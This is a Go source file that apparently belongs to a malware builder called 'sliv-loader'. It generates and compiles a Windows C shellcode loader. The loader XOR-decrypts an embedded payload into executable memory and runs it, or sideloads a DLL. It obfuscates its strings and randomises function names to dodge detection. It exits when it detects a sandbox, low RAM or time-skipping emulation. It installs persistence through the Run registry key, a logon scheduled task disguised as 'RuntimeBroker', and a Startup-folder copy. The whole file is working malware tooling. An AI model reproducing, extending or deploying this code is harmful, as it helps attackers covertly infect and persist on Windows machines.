package loader

import (
	"bytes"
	"context"
	"encoding/base64"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
)

// ToolchainError is a missing host compiler (HTTP 503), not a bad request.
type ToolchainError struct {
	Msg string
}

func (e *ToolchainError) Error() string { return e.Msg }

func useMingwC(opts Options) bool {
	return opts.GOOS == "windows" && (opts.GOARCH == "amd64" || opts.GOARCH == "386")
}

// UseMingwC is true when Windows amd64/386 wrap is compiled as MinGW C.
func UseMingwC(opts Options) bool { return useMingwC(opts) }

func mingwCC(arch string) string {
	switch arch {
	case "amd64":
		return "x86_64-w64-mingw32-gcc"
	case "386":
		return "i686-w64-mingw32-gcc"
	default:
		return ""
	}
}

func lookMingw(arch string) (string, error) {
	cc := mingwCC(arch)
	if cc == "" {
		return "", fmt.Errorf("no mingw triple for windows/%s", arch)
	}
	p, err := exec.LookPath(cc)
	if err != nil {
		pkg := "gcc-mingw-w64-x86-64"
		if arch == "386" {
			pkg = "gcc-mingw-w64-i686"
		}
		return "", &ToolchainError{Msg: cc + " not found on this host; apt install " + pkg}
	}
	return p, nil
}

func cByteLit(b []byte) string {
	if len(b) == 0 {
		return "{0}"
	}
	var s strings.Builder
	s.WriteByte('{')
	for i, x := range b {
		if i > 0 {
			s.WriteByte(',')
		}
		fmt.Fprintf(&s, "0x%02x", x)
	}
	s.WriteByte('}')
	return s.String()
}

func cXorLit(s string, k byte) string {
	b := make([]byte, len(s))
	for i := 0; i < len(s); i++ {
		b[i] = s[i] ^ k
	}
	return cByteLit(b)
}

func buildWindowsC(opts Options) (*Result, error) {
	cc, err := lookMingw(opts.GOARCH)
	if err != nil {
		return nil, err
	}
	compileMu.Lock()
	defer compileMu.Unlock()
	dir, err := os.MkdirTemp("", "sliv-loader-*")
	if err != nil {
		return nil, fmt.Errorf("temp dir: %w", err)
	}
	defer os.RemoveAll(dir)

	if !opts.DiskDLL {
		payload := xorCopy(opts.Payload, combinedXORKey(opts))
		if err := os.WriteFile(filepath.Join(dir, "cfg.dat"), payload, 0o600); err != nil {
			return nil, err
		}
	}
	noise := opts.Noise
	if len(noise) == 0 {
		noise = []byte{0}
	}
	if err := os.WriteFile(filepath.Join(dir, "n.bin"), noise, 0o600); err != nil {
		return nil, err
	}
	if err := os.WriteFile(filepath.Join(dir, "main.c"), []byte(windowsCSource(opts)), 0o644); err != nil {
		return nil, err
	}

	outPath := filepath.Join(dir, "loader.exe")
	args := []string{
		"-std=gnu23", "-Os", "-s", "-fno-ident", "-Wl,--gc-sections",
		"-o", outPath, "main.c",
		"-lkernel32", "-luser32", "-ladvapi32",
	}
	if opts.HideConsole {
		args = append([]string{"-mwindows"}, args...)
	}

	ctx, cancel := context.WithTimeout(context.Background(), compileTimeout)
	defer cancel()
	cmd := exec.CommandContext(ctx, cc, args...)
	cmd.Dir = dir
	var stderr bytes.Buffer
	cmd.Stdout = &stderr
	cmd.Stderr = &stderr
	if err := cmd.Run(); err != nil {
		msg := strings.TrimSpace(stderr.String())
		if ctx.Err() == context.DeadlineExceeded {
			return nil, fmt.Errorf("compile timed out after %s", compileTimeout)
		}
		if msg == "" {
			msg = err.Error()
		}
		return nil, fmt.Errorf("mingw-c %s/%s: %s", opts.GOOS, opts.GOARCH, msg)
	}
	bin, err := os.ReadFile(outPath)
	if err != nil {
		return nil, fmt.Errorf("read compiled loader: %w", err)
	}
	if len(bin) == 0 {
		return nil, fmt.Errorf("compiler produced an empty file")
	}
	engine := "mingw-c"
	res := &Result{
		Filename:    Filename(opts.Name, opts.GOOS),
		DataB64:     base64.StdEncoding.EncodeToString(bin),
		Size:        len(bin),
		OS:          opts.GOOS,
		Arch:        opts.GOARCH,
		HideConsole: opts.HideConsole,
		Persistence: opts.Persistence,
		PayloadSize: len(opts.Payload),
		Engine:      engine,
	}
	if opts.DiskDLL {
		res.Engine = "mingw-c-dll"
		res.DllFilename = opts.DLLName
		res.DllDataB64 = base64.StdEncoding.EncodeToString(opts.Payload)
	}
	return res, nil
}

func windowsCSource(opts Options) string {
	k := nameKey(opts)
	key := combinedXORKey(opts)
	pn := opts.PersistName
	if pn == "" {
		pn = "RuntimeBroker"
	}
	dllName := opts.DLLName
	if dllName == "" {
		dllName = "payload.dll"
	}
	export := opts.Export
	if export == "" {
		export = DefaultRDIExport
	}
	xorKeyDecl := "static const unsigned char xor_key[] = " + cByteLit([]byte(key)) + ";\n"
	blobDecl := `static const unsigned char blob[] = {
#embed "cfg.dat"
};
`
	dllDecls := ""
	if opts.DiskDLL {
		xorKeyDecl = ""
		blobDecl = ""
		dllDecls = "static const unsigned char e_dll[] = " + cXorLit(dllName, k) + ";\n" +
			"static const unsigned char e_exp[] = " + cXorLit(export, k) + ";\n"
	}
	src := `#define WIN32_LEAN_AND_MEAN
#include <windows.h>

#define DK ((unsigned char)` + strconv.Itoa(int(k)) + `)
#define HIDE_CONSOLE ` + bool01(opts.HideConsole) + `
#define DISK_DLL ` + bool01(opts.DiskDLL) + `

` + xorKeyDecl + dllDecls + `static const unsigned char e_method[] = ` + cXorLit(opts.Persistence, k) + `;
static const unsigned char e_hal9[] = ` + cXorLit("HAL9TH", k) + `;
static const unsigned char e_log[] = ` + cXorLit("sliv-loader.log", k) + `;
static const unsigned char e_run[] = ` + cXorLit(`Software\Microsoft\Windows\CurrentVersion\Run`, k) + `;
static const unsigned char e_app[] = ` + cXorLit("APPDATA", k) + `;
static const unsigned char e_ms[] = ` + cXorLit("Microsoft", k) + `;
static const unsigned char e_win[] = ` + cXorLit("Windows", k) + `;
static const unsigned char e_sm[] = ` + cXorLit("Start Menu", k) + `;
static const unsigned char e_pr[] = ` + cXorLit("Programs", k) + `;
static const unsigned char e_st[] = ` + cXorLit("Startup", k) + `;
static const unsigned char e_sch[] = ` + cXorLit("schtasks", k) + `;
static const unsigned char e_fmt[] = ` + cXorLit(`%S /create /tn %s /sc ONLOGON /tr "%s" /rl LIMITED /f`, k) + `;
static const unsigned char e_off[] = ` + cXorLit("off", k) + `;
static const unsigned char e_rk[] = ` + cXorLit("runkey_hkcu", k) + `;
static const unsigned char e_tk[] = ` + cXorLit("schtask_logon", k) + `;
static const unsigned char e_ln[] = ` + cXorLit("startup_lnk", k) + `;
static const unsigned char e_all[] = ` + cXorLit("all", k) + `;
static const wchar_t persist_name[] = L` + strconv.Quote(pn) + `;
static const char build_id[] = ` + strconv.Quote(opts.BuildID) + `;

` + blobDecl + `static const unsigned char noise[] = {
#embed "n.bin"
};
static volatile unsigned char noise_keep;

static void ds(const unsigned char *enc, int n, char *out) {
	int i;
	for (i = 0; i < n; i++) out[i] = (char)(enc[i] ^ DK);
	out[n] = 0;
}

static int lab_fast(void) {
	char v[8];
	DWORD n = GetEnvironmentVariableA("SLIV_BG", v, sizeof(v));
	return n == 1 && v[0] == '1';
}

static void note(const char *msg) {
	wchar_t dir[MAX_PATH], path[MAX_PATH];
	char name[32];
	HANDLE h;
	DWORD w;
	if (lab_fast() || !msg || !msg[0]) return;
	if (!GetTempPathW(MAX_PATH, dir)) return;
	ds(e_log, (int)sizeof(e_log), name);
	if (lstrlenW(dir) + 16 >= MAX_PATH) return;
	lstrcpyW(path, dir);
	MultiByteToWideChar(CP_UTF8, 0, name, -1, path + lstrlenW(path), 32);
	h = CreateFileW(path, FILE_APPEND_DATA, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (h == INVALID_HANDLE_VALUE) return;
	WriteFile(h, msg, (DWORD)lstrlenA(msg), &w, NULL);
	WriteFile(h, "\n", 1, &w, NULL);
	CloseHandle(h);
}

static int sandbox(void) {
	wchar_t name[32], want[16];
	char tmp[16];
	DWORD n = 32;
	if (lab_fast()) return 0;
	if (!GetComputerNameW(name, &n)) return 0;
	ds(e_hal9, (int)sizeof(e_hal9), tmp);
	if (!MultiByteToWideChar(CP_UTF8, 0, tmp, -1, want, 16)) return 0;
	return lstrcmpiW(name, want) == 0;
}

static int enough_ram(void) {
	MEMORYSTATUSEX m;
	if (lab_fast()) return 1;
	m.dwLength = sizeof(m);
	if (!GlobalMemoryStatusEx(&m)) return 1;
	return m.ullTotalPhys >= (2ull << 30);
}

static void pause_emu(void) {
	DWORD t0, t1;
	if (lab_fast()) return;
	t0 = GetTickCount();
	Sleep(1800);
	t1 = GetTickCount();
	if (t1 >= t0 && t1 - t0 < 1400) {
		note("emu");
		ExitProcess(0);
	}
}

static void hide_window(void) {
	HWND hwnd;
	if (!HIDE_CONSOLE) return;
	hwnd = GetConsoleWindow();
	if (hwnd) ShowWindow(hwnd, 0);
	FreeConsole();
}

static int method_is(const unsigned char *enc, int n) {
	char want[32], got[32];
	ds(enc, n, want);
	ds(e_method, (int)sizeof(e_method), got);
	return lstrcmpiA(want, got) == 0;
}

static int method_all(void) {
	return method_is(e_all, (int)sizeof(e_all));
}

static wchar_t *last_slash(wchar_t *p) {
	wchar_t *last = NULL;
	for (; p && *p; p++) {
		if (*p == L'\\' || *p == L'/') last = p;
	}
	return last;
}

#if DISK_DLL
static void sibling_dll_path(const wchar_t *exe, wchar_t *out, int cap) {
	char tmp[80];
	wchar_t wdll[80];
	wchar_t *s;
	if (!exe || !out || cap < 8) return;
	lstrcpynW(out, exe, cap);
	s = last_slash(out);
	if (s) s[1] = 0;
	else out[0] = 0;
	ds(e_dll, (int)sizeof(e_dll), tmp);
	if (!MultiByteToWideChar(CP_UTF8, 0, tmp, -1, wdll, 80)) return;
	if (lstrlenW(out) + lstrlenW(wdll) + 1 >= cap) return;
	lstrcatW(out, wdll);
}

static void copy_sibling(const wchar_t *self, const wchar_t *dst_exe) {
	wchar_t src_dll[MAX_PATH], dst_dll[MAX_PATH];
	sibling_dll_path(self, src_dll, MAX_PATH);
	sibling_dll_path(dst_exe, dst_dll, MAX_PATH);
	if (!src_dll[0] || !dst_dll[0]) return;
	if (lstrcmpiW(src_dll, dst_dll) == 0) return;
	CopyFileW(src_dll, dst_dll, FALSE);
}
#endif

static void persist_run(const wchar_t *self) {
	HKEY h = NULL;
	wchar_t sub[128];
	char tmp[96];
	ds(e_run, (int)sizeof(e_run), tmp);
	if (!MultiByteToWideChar(CP_UTF8, 0, tmp, -1, sub, 128)) return;
	if (RegCreateKeyExW(HKEY_CURRENT_USER, sub, 0, NULL, 0, KEY_SET_VALUE, NULL, &h, NULL) != 0 || !h) return;
	RegSetValueExW(h, persist_name, 0, REG_SZ, (const BYTE *)self, (DWORD)((lstrlenW(self) + 1) * sizeof(wchar_t)));
	RegCloseKey(h);
}

static void persist_task(const wchar_t *self) {
	STARTUPINFOW si;
	PROCESS_INFORMATION pi;
	wchar_t cmd[1024], wfmt[128];
	char sch[16], fmt[96];
	ds(e_sch, (int)sizeof(e_sch), sch);
	ds(e_fmt, (int)sizeof(e_fmt), fmt);
	if (!MultiByteToWideChar(CP_UTF8, 0, fmt, -1, wfmt, 128)) return;
	wsprintfW(cmd, wfmt, sch, persist_name, self);
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = 0;
	if (CreateProcessW(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
		CloseHandle(pi.hThread);
		CloseHandle(pi.hProcess);
	}
}

static void persist_startup(const wchar_t *self) {
	wchar_t app[MAX_PATH], dst[MAX_PATH], wtmp[64];
	char tmp[32];
	DWORD n;
	ds(e_app, (int)sizeof(e_app), tmp);
	MultiByteToWideChar(CP_UTF8, 0, tmp, -1, wtmp, 64);
	n = GetEnvironmentVariableW(wtmp, app, MAX_PATH);
	if (!n || n >= MAX_PATH) return;
	lstrcpyW(dst, app);
	lstrcatW(dst, L"\\");
	ds(e_ms, (int)sizeof(e_ms), tmp);
	MultiByteToWideChar(CP_UTF8, 0, tmp, -1, wtmp, 64);
	lstrcatW(dst, wtmp);
	lstrcatW(dst, L"\\");
	ds(e_win, (int)sizeof(e_win), tmp);
	MultiByteToWideChar(CP_UTF8, 0, tmp, -1, wtmp, 64);
	lstrcatW(dst, wtmp);
	lstrcatW(dst, L"\\");
	ds(e_sm, (int)sizeof(e_sm), tmp);
	MultiByteToWideChar(CP_UTF8, 0, tmp, -1, wtmp, 64);
	lstrcatW(dst, wtmp);
	lstrcatW(dst, L"\\");
	ds(e_pr, (int)sizeof(e_pr), tmp);
	MultiByteToWideChar(CP_UTF8, 0, tmp, -1, wtmp, 64);
	lstrcatW(dst, wtmp);
	lstrcatW(dst, L"\\");
	ds(e_st, (int)sizeof(e_st), tmp);
	MultiByteToWideChar(CP_UTF8, 0, tmp, -1, wtmp, 64);
	lstrcatW(dst, wtmp);
	CreateDirectoryW(dst, NULL);
	lstrcatW(dst, L"\\");
	lstrcatW(dst, persist_name);
	lstrcatW(dst, L".exe");
	if (lstrcmpiW(dst, self) == 0) return;
	CopyFileW(self, dst, FALSE);
#if DISK_DLL
	copy_sibling(self, dst);
#endif
}

static void persist(void) {
	wchar_t self[MAX_PATH];
	if (method_is(e_off, (int)sizeof(e_off)) || sizeof(e_method) == 0) return;
	if (!GetModuleFileNameW(NULL, self, MAX_PATH)) return;
	if (method_is(e_rk, (int)sizeof(e_rk)) || method_all()) persist_run(self);
	if (method_is(e_tk, (int)sizeof(e_tk)) || method_all()) persist_task(self);
	if (method_is(e_ln, (int)sizeof(e_ln)) || method_all()) persist_startup(self);
}

#if !DISK_DLL
static void jump(void *code, void *stack) {
#if defined(__x86_64__)
	__asm__ volatile(
		"movq %%rdx, %%rsp\n\t"
		"andq $-16, %%rsp\n\t"
		"subq $40, %%rsp\n\t"
		"call *%%rcx\n\t"
		:
		: "c"(code), "d"(stack)
		: "memory", "cc", "rax", "r8", "r9", "r10", "r11");
#elif defined(__i386__)
	__asm__ volatile(
		"movl %1, %%esp\n\t"
		"andl $-16, %%esp\n\t"
		"call *%0\n\t"
		:
		: "r"(code), "r"(stack)
		: "memory", "cc");
#endif
}

static void run(void) {
	SIZE_T n = sizeof(blob);
	SIZE_T page = 0x1000;
	SIZE_T reg = (n + page - 1) & ~(page - 1);
	LPVOID addr, st, stk;
	DWORD old = 0;
	unsigned char *dst;
	SIZE_T i, ks;
	if (n == 0) return;
	addr = VirtualAlloc(NULL, reg, MEM_RESERVE, PAGE_NOACCESS);
	if (!addr) {
		addr = VirtualAlloc(NULL, reg, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
		if (!addr) {
			note("va");
			return;
		}
	} else if (!VirtualAlloc(addr, reg, MEM_COMMIT, PAGE_READWRITE)) {
		if (!VirtualProtect(addr, reg, PAGE_READWRITE, &old)) {
			note("va");
			return;
		}
	}
	dst = (unsigned char *)addr;
	ks = sizeof(xor_key);
	for (i = 0; i < n; i++) dst[i] = blob[i] ^ xor_key[i % ks];
	if (!VirtualProtect(addr, n, PAGE_EXECUTE_READWRITE, &old)) {
		note("vp");
		return;
	}
	FlushInstructionCache(GetCurrentProcess(), addr, n);
	st = VirtualAlloc(NULL, 8u << 20, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!st) {
		note("va");
		return;
	}
	stk = (char *)st + (8u << 20) - 256;
	if (lab_fast()) {
		((void (*)(void))addr)();
		return;
	}
	jump(addr, stk);
	note("ret");
	for (;;) Sleep(0xFFFFFFFFu);
}
#else
static void run(void) {
	wchar_t self[MAX_PATH], dll[MAX_PATH];
	char exp[64];
	HMODULE h;
	void (*entry)(void);
	if (!GetModuleFileNameW(NULL, self, MAX_PATH)) {
		note("ll");
		return;
	}
	sibling_dll_path(self, dll, MAX_PATH);
	h = LoadLibraryW(dll);
	if (!h) {
		note("ll");
		return;
	}
	ds(e_exp, (int)sizeof(e_exp), exp);
	entry = (void (*)(void))GetProcAddress(h, exp);
	if (!entry) {
		note("gp");
		return;
	}
	entry();
	if (lab_fast()) return;
	note("ret");
	for (;;) Sleep(0xFFFFFFFFu);
}
#endif

static int sliv_main(void) {
	(void)build_id;
	noise_keep = noise[0];
	hide_window();
	if (sandbox()) {
		note("box");
		ExitProcess(0);
	}
	if (!enough_ram()) {
		note("ram");
		ExitProcess(0);
	}
	pause_emu();
	persist();
	run();
	return 0;
}

int WINAPI WinMain(HINSTANCE a, HINSTANCE b, LPSTR c, int d) {
	(void)a;
	(void)b;
	(void)c;
	(void)d;
	return sliv_main();
}

int main(void) { return sliv_main(); }
`
	return randomizeCIdents(src, []byte{k})
}

func randomizeCIdents(src string, seed []byte) string {
	names := []string{
		"persist_startup", "sibling_dll_path", "copy_sibling", "persist_task",
		"persist_run", "hide_window", "enough_ram", "pause_emu", "method_all",
		"method_is", "last_slash", "lab_fast", "sliv_main", "sandbox", "persist",
		"jump", "note", "run", "ds",
	}
	b := []byte(src)
	for _, n := range names {
		old := []byte(n)
		neu := morphIdent(old, seed)
		if bytes.Equal(old, neu) {
			continue
		}
		patchCIdent(b, old, neu)
	}
	return string(b)
}

func isCIdentChar(c byte) bool {
	return isWord(c) || c == '_'
}

func patchCIdent(buf, old, neu []byte) {
	if len(old) == 0 || len(old) != len(neu) {
		return
	}
	for i := 0; i+len(old) <= len(buf); {
		if !bytes.Equal(buf[i:i+len(old)], old) {
			i++
			continue
		}
		if i > 0 && isCIdentChar(buf[i-1]) {
			i++
			continue
		}
		if i+len(old) < len(buf) && isCIdentChar(buf[i+len(old)]) {
			i++
			continue
		}
		copy(buf[i:i+len(old)], neu)
		i += len(old)
	}
}

func bool01(v bool) string {
	if v {
		return "1"
	}
	return "0"
}
